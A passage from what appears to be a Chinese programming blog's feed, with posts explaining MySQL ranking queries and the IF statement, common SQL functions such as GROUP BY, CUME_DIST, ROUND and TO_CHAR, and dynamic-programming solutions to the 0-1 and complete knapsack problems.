1,</div><div class="line"></div><div class="line">		@prevRank := age</div><div class="line"></div><div class="line">	FROM</div><div class="line"></div><div class="line">		players p,</div><div class="line"></div><div class="line">		(</div><div class="line"></div><div class="line">			SELECT</div><div class="line"></div><div class="line">				@curRank := 0,</div><div class="line"></div><div class="line">				@prevRank := NULL,</div><div class="line"></div><div class="line">				@incRank := 1</div><div class="line"></div><div class="line">		) r</div><div class="line"></div><div class="line">	ORDER BY</div><div class="line"></div><div class="line">		age</div><div class="line"></div><div class="line">	) s</div></pre></td></tr></table></figure>
<p>这是一个查询中的子查询。我们使用三个变量(<code>@incRank，@prevRank，@curRank</code>)来计算关系的情况下，在查询结果中我们已经补全了因为并列而导致的排名空位。我们已经封闭子查询到查询。这个查询相当于MSSQL和ORACLE中的RANK()函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">| PID |    NAME | AGE | RANK |</div><div class="line"></div><div class="line">|-----|---------|-----|------|</div><div class="line"></div><div class="line">|  10 |   Peter |  19 |    1 |</div><div class="line"></div><div class="line">|  12 |   Andre |  20 |    2 |</div><div class="line"></div><div class="line">|   2 |    Vino |  20 |    2 |</div><div class="line"></div><div class="line">|   3 |    John |  20 |    2 |</div><div class="line"></div><div class="line">|  11 |     Tom |  20 |    2 |</div><div class="line"></div><div class="line">|   5 |   Brian |  21 |    6 |</div><div class="line"></div><div class="line">|   4 |    Andy |  22 |    7 |</div><div class="line"></div><div class="line">|   9 |  George |  23 |    8 |</div><div class="line"></div><div class="line">|   6 |     Dew |  24 |    9 |</div><div class="line"></div><div class="line">|   7 |    Kris |  25 |   10 |</div><div class="line"></div><div class="line">|   1 |  Samual |  25 |   10 |</div><div class="line"></div><div class="line">|   8 | William |  26 |   12 |</div></pre></td></tr></table></figure>
<p>在这里我们可以看到，Andre，Vino，John和Tom都有相同的age，所以他们排名并列第二。下一个最高年龄的球员(Brian)排名第6，而不是第3，因为有4个人并列排名在第2。</p>
<h4 id="MySQL-IF"><a href="#MySQL-IF" class="headerlink" title="MySQL IF"></a>MySQL IF</h4><p>MySQL IF语句允许您根据表达式的某个条件或值结果来执行一组SQL语句。 要在MySQL中形成一个表达式，可以结合文字，变量，运算符，甚至函数来组合。表达式可以返回TRUE,FALSE或NULL，这三个值之一。</p>
<p>下面说明了IF语句的语法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">IF expression THEN </div><div class="line"></div><div class="line">   statements;</div><div class="line"></div><div class="line">END IF;</div></pre></td></tr></table></figure>
<p>如果表达式<code>(expression)</code>计算结果为TRUE，那么将执行<code>statements</code>语句，否则控制流将传递到END IF之后的下一个语句。</p>
<p><img src="/images/数据库-07.jpg" alt="IF"></p>
<p>如果表达式计算结果为FALSE时执行语句，请使用IF ELSE语句，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">IF expression THEN</div><div class="line"></div><div class="line">   statements;</div><div class="line"></div><div class="line">ELSE</div><div class="line"></div><div class="line">   else-statements;</div><div class="line"></div><div class="line">END IF;</div></pre></td></tr></table></figure>
<p><img src="/images/数据库-08.jpg" alt="IF"></p>
<p>如果要基于多个表达式有条件地执行语句，则使用IF ELSEIF ELSE语句如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">IF expression THEN</div><div class="line"></div><div class="line">   statements;</div><div class="line"></div><div class="line">ELSEIF elseif-expression THEN</div><div class="line"></div><div class="line">   elseif-statements;</div><div class="line"></div><div class="line">...</div><div class="line"></div><div class="line">ELSE</div><div class="line"></div><div class="line">   else-statements;</div><div class="line"></div><div class="line">END IF;</div></pre></td></tr></table></figure>
<p>如果表达式<code>(expression)</code>求值为TRUE，则IF分支中的语句<code>(statements)</code>将执行；如果表达式求值为FALSE，则如果<code>elseif_expression</code>的计算结果为TRUE，MySQL将执行<code>elseif-expression</code>，否则执行ELSE分支中的<code>else-statements</code>语句。</p>
<p><img src="/images/数据库-09.jpg" alt="IF"></p>
<p>还有另一种操作：类似于三元运算符</p>
<ul>
<li><code>IF(where,result1,result2) = where?result1:result2</code></li>
</ul>
<p>例如 :<code>SELECT IF(1=1,1,2)    =&gt;  1</code></p>
<ul>
<li><code>IFNULL(result1,result2) = result1 is not null?result1:result2</code></li>
</ul>
<p>例如 :<code>SELECT IF(1,2)  =&gt; 1</code>　　</p>
<p>　　<code>SELECT IF(null,2) =&gt; 2</code></p>
<p>文章来源：<a href="https://www.jianshu.com/p/bb1b72a1623e" target="_blank" rel="external">https://www.jianshu.com/p/bb1b72a1623e</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h3&gt;&lt;p&gt;MySQL中没有Rank排名函数，当我们需要查询排名时，只能使用MySQL数据库中的基本查询语句来查询普通排名。尽管如此，可不要小瞧基础而简
    
    </summary>
    
      <category term="数据库" scheme="http://yoursite.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
      <category term="数据库" scheme="http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>数据库|在2018毕业生彩蛋中学到的</title>
    <link href="http://yoursite.com/2018/05/13/%E6%95%B0%E6%8D%AE%E5%BA%93-%E5%9C%A82018%E6%AF%95%E4%B8%9A%E7%94%9F%E5%BD%A9%E8%9B%8B%E4%B8%AD%E5%AD%A6%E5%88%B0%E7%9A%84/"/>
    <id>http://yoursite.com/2018/05/13/数据库-在2018毕业生彩蛋中学到的/</id>
    <published>2018-05-13T12:50:36.000Z</published>
    <updated>2018-05-13T16:44:30.943Z</updated>
    
    <content type="html"><![CDATA[<h3 id="DISTINCT"><a href="#DISTINCT" class="headerlink" title="DISTINCT"></a>DISTINCT</h3><p>SQL SELECT DISTINCT 语句</p>
<p>在表中，可能会包含重复值。这并不成问题，不过，有时您也许希望仅仅列出不同（distinct）的值。</p>
<p>关键词 <code>DISTINCT</code> 用于返回唯一不同的值。</p>
<p>语法：<code>SELECT DISTINCT 列名称 FROM 表名称</code></p>
<h3 id="GROUP-BY"><a href="#GROUP-BY" class="headerlink" title="GROUP BY"></a>GROUP BY</h3><p><code>GROUP BY</code>语句用于结合聚合函数，根据一个或多个列对结果集进行分组。</p>
<p>SQL GROUP BY 语法 :<code>SELECT column_name, aggregate_function(column_name) FROM table_name  WHERE column_name operator value
GROUP BY column_name;</code> </p>
<h4 id="用法详解"><a href="#用法详解" class="headerlink" title="用法详解"></a>用法详解</h4><p>原始表：</p>
<p><img src="/images/数据库-04.jpg" alt="原始数据"></p>
<h5 id="简单Group-By"><a href="#简单Group-By" class="headerlink" title="简单Group By"></a>简单Group By</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">select 类别, sum(数量) as 数量之和</div><div class="line">from A</div><div class="line">group by 类别</div></pre></td></tr></table></figure>
<p>返回结果如下表，实际上就是分类汇总。</p>
<p><img src="/images/数据库-05.jpg" alt="Group by"></p>
<h5 id="Group-By中Select指定的字段限制"><a href="#Group-By中Select指定的字段限制" class="headerlink" title="Group By中Select指定的字段限制"></a>Group By中Select指定的字段限制</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">select 类别, sum(数量) as 数量之和, 摘要</div><div class="line">from A</div><div class="line">group by 类别</div><div class="line">order by 类别 desc</div></pre></td></tr></table></figure>
<p>这个sql语句是错误的，原因是<strong>在select指定的字段要么就要包含在Group By语句的后面，作为分组的依据；要么就要被包含在聚合函数中。</strong></p>
<h5 id="GROUP-BY-多列分组的使用"><a href="#GROUP-BY-多列分组的使用" class="headerlink" title="GROUP BY 多列分组的使用"></a>GROUP BY 多列分组的使用</h5><p>“多列分组”实际上就是就是按照多列（字段1+字段2）合并后的值进行分组。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">select 类别, 摘要, sum(数量) as 数量之和</div><div class="line">from A</div><div class="line">group by  类别, 摘要</div></pre></td></tr></table></figure>
<p><img src="/images/数据库-06.jpg" alt="Group by"></p>
<p>“多列分组”实际上就是就是按照多列（类别+摘要）合并后的值进行分组，示例4中可以看到“a, a2001, 13”为“a, a2001, 11”和“a, a2001, 2”两条记录的合并。</p>
<h5 id="Group-By与聚合函数"><a href="#Group-By与聚合函数" class="headerlink" title="Group By与聚合函数"></a>Group By与聚合函数</h5><p>在示例3中提到group by语句中select指定的字段必须是“分组依据字段”，其他字段若想出现在select中则必须包含在聚合函数中，常见的聚合函数如下表：</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>作用</th>
<th>支持性</th>
</tr>
</thead>
<tbody>
<tr>
<td>sum(列名)</td>
<td>求和    　　　</td>
<td>　</td>
</tr>
<tr>
<td>max(列名)</td>
<td>最大值    　</td>
<td>　　　</td>
</tr>
<tr>
<td>min(列名)</td>
<td>最小值    　</td>
<td>　　　</td>
</tr>
<tr>
<td>avg(列名)</td>
<td>平均值    　　</td>
<td>　　</td>
</tr>
<tr>
<td>first(列名)</td>
<td>第一条记录</td>
<td>仅Access支持</td>
</tr>
<tr>
<td>last(列名)</td>
<td>最后一条记录</td>
<td>仅Access支持</td>
</tr>
<tr>
<td>count(列名)</td>
<td>统计记录数</td>
<td>注意和count(*)的区别</td>
</tr>
</tbody>
</table>
<p>例如：</p>
<ul>
<li>求各组平均值:<code>select 类别, avg(数量) AS 平均值 from A group by 类别;</code></li>
<li>求各组记录数目:<code>select 类别, count(*) AS 记录数 from A group by 类别;</code></li>
</ul>
<h5 id="Having与Where的区别"><a href="#Having与Where的区别" class="headerlink" title="Having与Where的区别"></a>Having与Where的区别</h5><ul>
<li>where 子句的作用是在对查询结果进行分组前，将不符合where条件的行去掉，即在分组之前过滤数据，where条件中不能包含聚组函数，使用where条件过滤出特定的行。</li>
<li>having 子句的作用是筛选满足条件的组，即在分组之后过滤数据，条件中经常包含聚组函数，使用having 条件过滤出特定的组，也可以使用多个分组标准进行分组。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">select 类别, sum(数量) as 数量之和 from A</div><div class="line">group by 类别</div><div class="line">having sum(数量) &gt; 18</div></pre></td></tr></table></figure>
<p>Having和Where的联合使用方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">select 类别, SUM(数量)from A</div><div class="line">where 数量 &gt; 8</div><div class="line">group by 类别</div><div class="line">having SUM(数量) &gt; 10</div></pre></td></tr></table></figure></p>
<h3 id="nvl函数"><a href="#nvl函数" class="headerlink" title="nvl函数"></a>nvl函数</h3><p>NVL(E1, E2)的功能为：如果E1为NULL，则函数返回E2，否则返回E1本身。</p>
<h3 id="CUME-DIST-函数"><a href="#CUME-DIST-函数" class="headerlink" title="CUME_DIST 函数"></a>CUME_DIST 函数</h3><p>计算某个窗口或分区中某个值的累积分布。假定升序排序，则使用以下公式确定累积分布：<code>count of rows with values &lt;= x / count of rows in the window or partition</code></p>
<p>其中，x 等于 ORDER BY 子句中指定的列的当前行中的值。以下数据集说明了此公式的使用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Row#	Value	  Calculation    CUME_DIST</div><div class="line">1        2500	   (1)/(5)	       0.2</div><div class="line">2        2600	   (2)/(5)	   	   0.4</div><div class="line">3        2800	   (3)/(5)	   	   0.6</div><div class="line">4        2900	   (4)/(5)	   	   0.8</div><div class="line">5        3100	   (5)/(5)	       1.0</div></pre></td></tr></table></figure>
<p>返回值范围介于 0 和 1（含 1）之间。</p>
<p>语法：</p>
<pre><code>CUME_DIST ()
OVER ( 
[ PARTITION BY partition_expression ] 
[ ORDER BY order_list ]
)
</code></pre><p>参数：</p>
<pre><code>* OVER：一个指定窗口分区的子句。OVER 子句不能包含窗口框架规范。

* PARTITION BY partition_expression：可选。一个设置 OVER 子句中每个组的记录范围的表达式。

 * ORDER BY order_list：用于计算累积分布的表达式。该表达式必须具有数字数据类型或可隐式转换为 1。如果省略 ORDER BY，则所有行的返回值为 1。
</code></pre><p>如果 ORDER BY 未生成唯一顺序，则行的顺序是不确定的。</p>
<p>返回类型：FLOAT8</p>
<p>效果展示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">select * from user;</div><div class="line"> OK</div><div class="line">user.dept    user.userid    user.sal</div><div class="line">d1    user1    1000</div><div class="line">d1    user2    2000</div><div class="line">d1    user3    3000</div><div class="line">d2    user4    4000</div><div class="line">d2    user5    5000</div></pre></td></tr></table></figure>
<p>比如，统计小于等于当前薪水的人数，所占总人数的比例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">select dept,userid,sal,</div><div class="line">cume_dist() over(order by sal) as rn1,</div><div class="line">cume_dist() over(partition by dept order by sal) as rn2</div><div class="line">from user;</div><div class="line"></div><div class="line">OK</div><div class="line">dept    userid    sal    rn1    rn2</div><div class="line">d1    user1    1000    0.2    0.3333333333333333</div><div class="line">d1    user2    2000    0.4    0.6666666666666666</div><div class="line">d1    user3    3000    0.6    1.0</div><div class="line">d2    user4    4000    0.8    0.5</div><div class="line">d2    user5    5000    1.0    1.0</div></pre></td></tr></table></figure></p>
<p>解释：</p>
<ul>
<li>rn1: 没有partition,所有数据均为1组，总行数为5，<ul>
<li>第一行：小于等于1000的行数为1，因此，1/5=0.2</li>
<li>第三行：小于等于3000的行数为3，因此，3/5=0.6</li>
</ul>
</li>
<li>rn2: 按照部门分组，dpet=d1的行数为3,<br>  -第二行：小于等于2000的行数为2，因此，2/3=0.6666666666666666</li>
</ul>
<h3 id="rank函数"><a href="#rank函数" class="headerlink" title="rank函数"></a>rank函数</h3><p>rank函数是排名函数。rank函数最常用的是求某一个数值在某一区域内的排名。</p>
<ul>
<li>语法：<code>RANK() OVER([&lt;partition_by_clause&gt;]&lt;order by clause&gt;)</code></li>
<li>参数<ul>
<li>partition_by_clause 将from子句生成的结果集划分为应用到RANK函数的分区。</li>
<li>Order_by_clause确定将RANK值应用到分区中的行时所使用的顺序。</li>
</ul>
</li>
</ul>
<h3 id="round函数"><a href="#round函数" class="headerlink" title="round函数"></a>round函数</h3><p>Round函数返回一个数值，该数值是按照指定的小数位数进行四舍五入运算的结果。可是当保留位跟着的即使是5，有可能进位，也有可能舍去，机会各50%。这样就会造成在应用程序中计算有误。</p>
<ul>
<li>语法:<code>round(number,digits)</code> </li>
<li>参数<ul>
<li>number,要四舍五入的数，digits是要小数点后保留的位数。</li>
</ul>
</li>
<li>返回值 ：四舍五入后的值</li>
</ul>
<p>注： </p>
<ul>
<li>如果 digits 大于 0，则四舍五入到指定的小数位。 </li>
<li>如果 digits 等于 0，则四舍五入到最接近的整数。 </li>
<li>如果 digits 小于 0，则在小数点左侧进行四舍五入。</li>
<li>如果round函数只有参数number,等同于digits 等于 0。</li>
</ul>
<p>举例：</p>
<ul>
<li>round(3.1415926,2)=3.14;</li>
<li>round(3.1415926,3)=3.142;</li>
<li>select round(193,-2)from dual; 200</li>
<li>select round(193,-1)from dual;190</li>
<li>select round(193,-3)from dual;0</li>
</ul>
<h3 id="TO-CHAR-函数"><a href="#TO-CHAR-函数" class="headerlink" title="TO_CHAR() 函数"></a>TO_CHAR() 函数</h3><p>to_char()，计算机语言函数，指的是将数值型或者日期型转化为字符型。</p>
<table>
<thead>
<tr>
<th>例子</th>
<th>结果</th>
</tr>
</thead>
<tbody>
<tr>
<td>to_char(1210.73, ‘9999.9’)</td>
<td>would return ‘1210.7’</td>
</tr>
<tr>
<td>to_char(1210.73, ‘9,999.99’)</td>
<td>would return ‘1,210.73’</td>
</tr>
<tr>
<td>to_char(1210.73, ‘$9,999.00’)</td>
<td>would return ‘$1,210.73’</td>
</tr>
<tr>
<td>to_char(21, ‘000099’)</td>
<td>would return ‘000021’</td>
</tr>
</tbody>
</table>
<p>The following is a list of valid parameters when the to_char function is used to convert a date to a string. These parameters can be used in many combinations.</p>
<p><img src="/images/数据库-03.png" alt="to_char函数模板"></p>
<p>The following are date examples for the to_char function.</p>
<table>
<thead>
<tr>
<th>例子</th>
<th>结果</th>
</tr>
</thead>
<tbody>
<tr>
<td>to_char(sysdate, ‘yyyy/mm/dd’);</td>
<td>would return ‘2003/07/09’</td>
</tr>
<tr>
<td>to_char(sysdate, ‘Month DD, YYYY’);</td>
<td>would return ‘July 09, 2003’</td>
</tr>
<tr>
<td>to_char(sysdate, ‘FMMonth DD, YYYY’);</td>
<td>would return ‘July 9, 2003’</td>
</tr>
<tr>
<td>to_char(sysdate, ‘MON DDth, YYYY’);</td>
<td>would return ‘JUL 09TH, 2003’</td>
</tr>
<tr>
<td>to_char(sysdate, ‘FMMON DDth, YYYY’);</td>
<td>would return ‘JUL 9TH, 2003’</td>
</tr>
<tr>
<td>to_char(sysdate, ‘FMMon ddth, YYYY’);</td>
<td>would return ‘Jul 9th, 2003’</td>
</tr>
</tbody>
</table>
<p>You will notice that in some examples, the format_mask parameter begins with “FM”. This means that zeros and blanks are suppressed. This can be seen in the examples below.</p>
<table>
<thead>
<tr>
<th>例子</th>
<th>结果</th>
</tr>
</thead>
<tbody>
<tr>
<td>to_char(sysdate, ‘FMMonth DD, YYYY’);</td>
<td>would return ‘July 9, 2003’</td>
</tr>
<tr>
<td>to_char(sysdate, ‘FMMON DDth, YYYY’);</td>
<td>would return ‘JUL 9TH, 2003’</td>
</tr>
<tr>
<td>to_char(sysdate, ‘FMMon ddth, YYYY’);</td>
<td>would return ‘Jul 9th, 2003’</td>
</tr>
</tbody>
</table>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;DISTINCT&quot;&gt;&lt;a href=&quot;#DISTINCT&quot; class=&quot;headerlink&quot; title=&quot;DISTINCT&quot;&gt;&lt;/a&gt;DISTINCT&lt;/h3&gt;&lt;p&gt;SQL SELECT DISTINCT 语句&lt;/p&gt;
&lt;p&gt;在表中，可能会包含重复值。这并不
    
    </summary>
    
      <category term="数据库" scheme="http://yoursite.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
      <category term="数据库" scheme="http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>计算机算法|动态规划之背包问题</title>
    <link href="http://yoursite.com/2018/05/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E4%B9%8B0-1%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/"/>
    <id>http://yoursite.com/2018/05/13/计算机算法-动态规划之0-1背包问题/</id>
    <published>2018-05-12T17:26:51.000Z</published>
    <updated>2018-05-18T16:33:17.187Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0-1背包问题"><a href="#0-1背包问题" class="headerlink" title="0-1背包问题"></a>0-1背包问题</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>有 N 件物品和一个容量为 V 的背包。第 i 件物品的费用是 c[i]，价值是 w[i]。求解将哪些<br>物品装入背包可使这些物品的费用总和不超过背包容量，且价值总和最大。</p>
<h4 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h4><p>这是最基础的背包问题，特点是：<strong>每种物品仅有一件，可以选择放或不放。</strong></p>
<p>用子问题定义状态：<strong>即 f[i][v]表示前 i 件物品恰放入一个容量为 v 的背包可以获得的最大<br>价值。</strong>则其状态转移方程便是：<code>f[i][v]=max{f[i-1][v],f[i-1][v-c[i]]+w[i]}</code>。</p>
<p>这个方程非常重要，基本上所有跟背包相关的问题的方程都是由它衍生出来的。所以有必要将它详细解释一下：<code>将前 i 件物品放入容量为 v 的背包中</code>这个子问题，若只考虑第 i 件物品的策略（放或不放），那么就可以<strong>转化为一个只牵扯前 i-1 件物品的问题</strong>。</p>
<ul>
<li><p>如果不放第 i 件物品，那么问题就转化为“前 i-1 件物品放入容量为 v 的背包中”；</p>
</li>
<li><p>如果放第 i 件物品，那么问题就转化为“前 i-1 件物品放入剩下的容量为 <code>v-c[i]</code>的背包中”，此时能获得的最大价值就是 <code>f[i-1][v-c[i]]</code>再加上通过放入第 i 件物品获得的价值 <code>w[i]</code>。</p>
</li>
</ul>
<p>来段代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">for (int i=1;i&lt;=n;++i) &#123;　for (int j=v;j&gt;=0;--j)　　 &#123;</div><div class="line">       if(c[i]&lt;=j)//如果当前物品可以放入当前空间的背包</div><div class="line">       f[i][j]=max(f[i-1][j],f[i-1][j-c[i]]+w[i]);</div><div class="line">       else f[i][j]=f[i-1][j];//如果当前物品放不进去，那么继承前i个物品在当前空间大小时的价值</div><div class="line">　　　&#125;</div><div class="line">  &#125;</div></pre></td></tr></table></figure></p>
<h4 id="优化空间复杂度"><a href="#优化空间复杂度" class="headerlink" title="优化空间复杂度"></a>优化空间复杂度</h4><p>从上面计算f[i][j]可以看出，在计算f[i][j]时只使用了f[i-1][0……j]，所以说并没有使用其他子问题，所以说在存储子问题解的时候，只用存储f[i-1]的子问题解即可；所以说可以用一个一维数组替换掉那个二维数组，一个存储子问题，一个存储正在解决的子问题。</p>
<p>那么，如果只用一个数组<code>f [0..V]</code>，能不能保证第 i 次循环结束后<code>f[v]</code>中表示的就是我们定义的状态 <code>f[i][v]</code>呢？<code>f[i][v]</code>是由 <code>f[i-1][v]</code>和 <code>f[i-1] [v-c[i]]</code>两个子问题递推而来，能否保证在推 <code>f[i][v]</code>时（也即在第 i 次主循环中推 f[v]时）能够得到 f[i-1][v]和 f[i-1][v -c[i]]的值呢？<strong>事实上，这要求在每次主循环中我们以 v=V..0 的顺序推 f[v]，这样才能保证推 f[v]时 f[v-c[i]]保存的是状态 f[i -1][v-c[i]]的值。</strong></p>
<p>伪代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">for i=1..N</div><div class="line">  for v=V..0</div><div class="line">	f[v]=max&#123;f[v],f[v-c[i]]+w[i]&#125;;</div></pre></td></tr></table></figure></p>
<p>下面张图解释这一切：</p>
<p><img src="/images/计算机算法-背包问题-01.png" alt="0-1背包|一维数组"></p>
<h3 id="完全背包"><a href="#完全背包" class="headerlink" title="完全背包"></a>完全背包</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>在n种物品中选取若干件（同一种物品可多次选取）放在空间为v的背包里，每种物品的体积为c1，c2，…，cn，与之相对应的价值为w1,w2，…，wn.求解怎么装物品可使背包里物品总价值最大。</p>
<p>不难发现<code>完全背包问题</code>与<code>0-1背包问题</code>的区别在于完全背包每一件物品的数量都有无限个，而01背包每件物品数量只有1个。所以说与它相关的策略已经不是只有取和不取这两种策略了，而是有取0件、取1件、取2件……等等很多种策略。</p>
<p>如果我们用和01背包一样的状态，f[i][v]表示前i种物品恰放入一个容量为v的背包的最大价值，那我们应该用k表示当前容量下可以装第i种物品的件数，那么k的范围应该是<code>0≤k≤v/c[i]</code>。既然要用当前物品i把当前容量装满，那需要<code>0≤k≤v/c[i]</code>件，其中k表示件数。</p>
<p>下面给出状态转移方程：<code>f[i][j] = max{f[i-1][v],f[i-1][v - k * c[i]] + k * w[i]}(0&lt;=k*c[i]&lt;=v)</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">for (int i = 1; i &lt; n; i++)&#123;</div><div class="line">   for (int j = 1; j &lt;= v; j++)&#123;</div><div class="line">     for (int k = 0; k*c[i] &lt;= j; k++)&#123;</div><div class="line">        if(c[i]&lt;=j)/*如果能放下*/</div><div class="line">            f[i][j] = max&#123;f[i-1][j],f[i-1][j - k * c[i]] + k * w[i]&#125;;/*要么不取，要么取0件、取1件、取2件……取k件*/</div><div class="line">        else/*放不下的话*/</div><div class="line">            f[i][j]=f[i-1][j]/*继承前i个物品在当前空间大小时的价值*/</div><div class="line">     &#125;</div><div class="line">  &#125;   </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>画一个v=6，c[1]=1 , w[1]=3 ; c[2]=3 , w[2]=10的表格:</p>
<p><img src="/images/计算机算法-背包问题-05.png" alt="完全背包"></p>
<h4 id="转化为-01-背包问题求解"><a href="#转化为-01-背包问题求解" class="headerlink" title="转化为 01 背包问题求解"></a>转化为 01 背包问题求解</h4><p>既然 01 背包问题是最基本的背包问题，那么我们可以<strong>考虑把完全背包问题转化为0-1背包问题来解</strong>。改变一下dp思路，让f[i][j]表示出在前i种物品中选取若干件物品放入容量为j的背包所得的最大价值。</p>
<p>所以说，对于第i件物品有放或不放两种情况，而放的情况里又分为放1件、2件、……v/c[i]件</p>
<p>如果不放那么<code>f[i][j]=f[i-1][j]</code>；如果确定放，那么当前背包中应该出现至少一件第i种物品，所以f[i][j]中至少应该出现一件第i种物品,即<code>f[i][j]=f[i][j-c[i]]+w[i]</code>，为什么会是f[i][j-c[i]]+w[i]？</p>
<p>因为我们要把当前物品i放入包内，因为物品i可以无限使用，所以要用<code>f[i][j-c[i]]</code>；如果我们用的是<code>f[i-1][j-c[i]]</code>，<code>f[i-1][j-c[i]]</code>的意思是说，我们只有一件当前物品i，所以我们在放入物品i的时候需要考虑到第i-1个物品的价值<code>(f[i-1][j-c[i]])</code>；但是现在我们有无限件当前物品i，我们不用再考虑第i-1个物品了，我们所要考虑的是在当前容量下是否再装入一个物品i，而<code>[j-c[i]]</code>的意思是指要确保<code>f[i][j]</code>至少有一件第i件物品，所以要预留c[i]的空间来存放一件第i种物品。<strong>总而言之，如果放当前物品i的话，它的状态就是它自己”i”，而不是上一个”i-1”</strong>。</p>
<p>所以说状态转移方程为：<code>f[i][j]=max(f[i-1][j],f[i][j-c[i]]+w[i])</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">for(int i = 0 ; i &lt; n ; i ++) </div><div class="line">&#123; </div><div class="line">    for(int j = 1 ; j &lt;= v ; j++) </div><div class="line">    &#123;</div><div class="line">        if(c[i]&lt;=j)</div><div class="line">        f[i][j] = max(f[i-1][j],f[i][j-c[i]]+w[i]); </div><div class="line">        else</div><div class="line">        f[i][j]=f[i-1][j];</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0-1背包问题&quot;&gt;&lt;a href=&quot;#0-1背包问题&quot; class=&quot;headerlink&quot; title=&quot;0-1背包问题&quot;&gt;&lt;/a&gt;0-1背包问题&lt;/h3&gt;&lt;h4 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题
    
    </summary>
    
      <category term="计算机算法" scheme="http://yoursite.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="计算机算法" scheme="http://yoursite.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
